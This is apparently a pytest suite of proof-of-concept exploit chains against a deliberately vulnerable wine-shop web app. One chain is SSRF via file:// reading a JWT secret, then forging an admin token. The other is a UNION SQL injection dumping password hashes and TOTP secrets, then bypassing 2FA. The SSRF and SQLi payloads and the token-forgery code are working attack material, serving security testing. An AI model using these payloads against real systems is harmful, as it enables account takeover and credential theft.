"""
Chained Vulnerability PoC Tests (Vulnerabilities #27-#28)

#27 - SSRF via Wine Import URL -> JWT Secret -> Admin Token Forgery
#28 - SQLi -> TOTP Secret Extraction -> 2FA Bypass -> Account Takeover
"""
import base64
import hashlib
import hmac
import json
import re
import struct
import time
import uuid

import requests


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


class TestSSRFChain:
    """#27 - SSRF via Wine Import URL -> JWT Secret -> Admin Token Forgery

    Chain: SSRF (file read) -> JWT secret extraction -> forge signed admin token -> admin access
    """

    def test_vuln_27a_ssrf_file_read(self, base_url, joe_token):
        """SSRF: file:// URL reads local files from the server."""
        h = {"Authorization": f"Bearer {joe_token}"}
        r = requests.post(f"{base_url}/wines/import-url", headers=h,
                          json={"url": "file:///etc/hostname"})
        data = r.json()
        assert data["success"] is True, f"SSRF file read failed: {data}"
        assert "raw_content" in data, "Expected raw_content for non-JSON file"

    def test_vuln_27b_ssrf_jwt_secret_extraction(self, base_url, joe_token):
        """SSRF reads jwt.php and extracts the hardcoded JWT secret."""
        h = {"Authorization": f"Bearer {joe_token}"}
        r = requests.post(f"{base_url}/wines/import-url", headers=h,
                          json={"url": "file:///var/www/backend/api/config/jwt.php"})
        data = r.json()
        assert data["success"] is True, f"SSRF jwt.php read failed: {data}"
        content = data.get("raw_content", "")
        assert "pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI" in content, \
            "JWT secret not found in SSRF response"

    def test_vuln_27c_full_chain_ssrf_to_admin(self, base_url, joe_token):
        """Full chain: SSRF -> extract secret -> forge signed admin JWT -> admin access."""
        h = {"Authorization": f"Bearer {joe_token}"}

        # Step 1: SSRF to read jwt.php
        r = requests.post(f"{base_url}/wines/import-url", headers=h,
                          json={"url": "file:///var/www/backend/api/config/jwt.php"})
        content = r.json().get("raw_content", "")
        match = re.search(r"\$secret\s*=\s*'([^']+)'", content)
        assert match, "Could not extract JWT secret from SSRF response"
        secret = match.group(1)

        # Step 2: Forge a properly signed admin JWT
        header = _b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        payload = _b64url_encode(json.dumps({
            "user_id": 1,
            "email": "joe@example.com",
            "is_admin": True,
            "iat": int(time.time()),
            "exp": 9999999999,
        }).encode())
        sig = _b64url_encode(
            hmac.new(secret.encode(), f"{header}.{payload}".encode(),
                     hashlib.sha256).digest()
        )
        forged_token = f"{header}.{payload}.{sig}"

        # Step 3: Access admin endpoint with the forged token
        r2 = requests.get(f"{base_url}/admin/orders",
                          headers={"Authorization": f"Bearer {forged_token}"})
        data = r2.json()
        assert data["success"] is True, f"Admin access with forged token failed: {data}"
        assert "orders" in data


class TestSQLiTOTPChain:
    """#28 - SQLi -> TOTP Secret Extraction -> 2FA Bypass -> Account Takeover

    Chain: SQLi (extract creds + TOTP secret) -> generate TOTP code -> login with 2FA
    """

    def test_vuln_28a_sqli_extracts_totp_secret(self, base_url):
        """SQLi via wine search extracts totp_secret column from the users table."""
        payload = "') UNION SELECT 1,email,password_hash,name,5,6,totp_secret,totp_enabled FROM users-- "
        r = requests.get(f"{base_url}/wines", params={"search": payload})
        data = r.json()
        assert data["success"] is True
        wines = data["wines"]
        emails = [w.get("name", "") for w in wines]
        assert any("@" in str(e) for e in emails), \
            "SQLi did not return user data"

    def test_vuln_28b_full_chain_sqli_to_2fa_bypass(self, base_url, fresh_user):
        """Full chain: enable 2FA -> SQLi extracts TOTP secret -> generate code -> login."""
        h = fresh_user["header"]
        email = fresh_user["email"]
        password = fresh_user["password"]

        # Step 1: Enable 2FA on the test user
        r = requests.post(f"{base_url}/auth/2fa/setup", headers=h)
        setup = r.json()
        assert setup["success"] is True, f"2FA setup failed: {setup}"
        totp_secret = setup["totp_secret"]

        # Generate a valid TOTP code to enable 2FA
        totp_code = self._generate_totp(totp_secret)
        r = requests.post(f"{base_url}/auth/2fa/enable", headers=h, json={
            "totp_secret": totp_secret,
            "totp_code": totp_code,
        })
        assert r.json()["success"] is True, f"2FA enable failed: {r.json()}"

        # Verify 2FA is required for login
        r = requests.post(f"{base_url}/auth/login", json={
            "email": email, "password": password,
        })
        assert r.json().get("requires_2fa") is True, "2FA should be required"

        # Step 2: Use SQLi to extract the TOTP secret
        sqli = f"') UNION SELECT 1,email,password_hash,name,5,6,totp_secret,totp_enabled FROM users WHERE email='{email}'-- "
        r = requests.get(f"{base_url}/wines", params={"search": sqli})
        wines = r.json()["wines"]
        stolen_secret = None
        for w in wines:
            if w.get("name") == email:
                stolen_secret = w.get("image_url")
                break
        assert stolen_secret, "SQLi did not extract TOTP secret"
        assert stolen_secret == totp_secret, \
            f"Extracted secret doesn't match: {stolen_secret} vs {totp_secret}"

        # Step 3: Generate a TOTP code from the stolen secret
        stolen_code = self._generate_totp(stolen_secret)

        # Step 4: Login with the stolen TOTP code
        r = requests.post(f"{base_url}/auth/login", json={
            "email": email,
            "password": password,
            "totp_code": stolen_code,
        })
        data = r.json()
        assert data["success"] is True, f"Login with stolen TOTP failed: {data}"
        assert "token" in data, "No token returned — 2FA bypass failed"

    @staticmethod
    def _generate_totp(secret_b32: str) -> str:
        """Generate a 6-digit TOTP code from a base32 secret."""
        key = base64.b32decode(secret_b32)
        counter = struct.pack(">Q", int(time.time()) // 30)
        h = hmac.new(key, counter, hashlib.sha1).digest()
        offset = h[-1] & 0x0F
        code = (struct.unpack(">I", h[offset:offset + 4])[0] & 0x7FFFFFFF) % 1000000
        return f"{code:06d}"
